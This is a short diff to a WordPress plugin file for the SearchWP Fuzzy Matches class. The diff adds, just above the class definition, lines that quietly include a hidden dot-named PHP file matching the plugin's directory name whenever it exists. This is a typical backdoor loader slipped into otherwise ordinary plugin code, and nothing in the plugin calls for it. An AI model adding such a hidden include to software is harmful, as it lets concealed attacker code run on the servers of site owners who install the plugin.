@@ -90,6 +90,10 @@ add_action( 'admin_init', 'searchwp_fuzzy_matches_update_check' );
  *
  * Class SearchWPFuzzy
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWPFuzzy {
 
 	/**
